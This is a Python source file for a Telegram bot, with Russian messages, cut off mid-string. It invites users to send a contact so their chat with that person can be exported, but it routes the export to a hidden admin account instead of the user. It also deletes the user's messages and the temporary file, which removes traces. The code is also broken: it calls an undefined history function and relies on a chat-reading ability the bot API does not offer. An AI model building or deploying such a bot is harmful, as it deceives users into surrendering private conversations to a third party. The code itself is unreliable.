import os
import logging
import asyncio
import sqlite3
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Временные сообщения с таймером
waiting_messages = {}

async def delete_message_after_delay(chat_id, message_id, delay=300):
    """Удаляет сообщение через указанное время (по умолчанию 5 минут)"""
    await asyncio.sleep(delay)
    try:
        await bot.delete_message(chat_id, message_id)
    except Exception:
        pass

@dp.message(Command("start"))
async def start(message: types.Message):
    webapp_url = "https://basik4z.github.io/daass-site/"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Открыть мини-приложение", web_app=WebAppInfo(url=webapp_url))]
    ])
    await message.answer(
        "✅ **ДААСС активен**\n\n"
        "📌 Нажми кнопку, чтобы открыть мини-приложение.\n"
        "📇 Отправь контакт для экспорта чата.",
        reply_markup=keyboard
    )

@dp.message(lambda message: message.contact)
async def handle_contact(message: types.Message):
    chat_id = message.chat.id
    contact = message.contact
    contact_name = f"{contact.first_name} {contact.last_name or ''}".strip()

    # Удаляем сообщение с контактом
    await bot.delete_message(chat_id, message.message_id)

    # Удаляем сообщение "Жду контакт..." если оно было
    if chat_id in waiting_messages:
        try:
            await bot.delete_message(chat_id, waiting_messages[chat_id])
        except Exception:
            pass
        del waiting_messages[chat_id]

    # Отправляем подтверждение
    await bot.send_message(
        chat_id,
        f"✅ Контакт **{contact_name}** получен. Начинаю экспорт..."
    )

    # Ищем чат с этим контактом
    try:
        chat = await bot.get_chat(contact.user_id)
        chat_id_contact = chat.id
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"❌ Не удалось найти чат с {contact_name}: {e}")
        return

    # Делаем экспорт
    html = get_chat_history(chat_id_contact)  # функция должна быть определена
    filename = f"chat_export_{contact_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    
    with open(filename, "w", encoding="utf-8") as f:
        f.write(html)

    with open(filename, "rb") as f:
        await bot.send_document(
            ADMIN_ID,
            f,
            caption=f"📦 Экспорт чата с **{contact_name}**\n\n✅ Контакт удалён."
        )

    os.remove(filename)

@dp.callback_query()
async def callback_handler(callback: types.CallbackQuery):
    if callback.data == "request_contact":
        chat_id = callback.message.chat.id
        
        # Отправляем сообщение "Жду контакт..."
        msg = await bot.send_message(
            chat_id,
            "📇 **Жду контакт...**\n\n"
            "⏳ Отправьте контакт человека, с которым хотите экспортировать чат.\n\n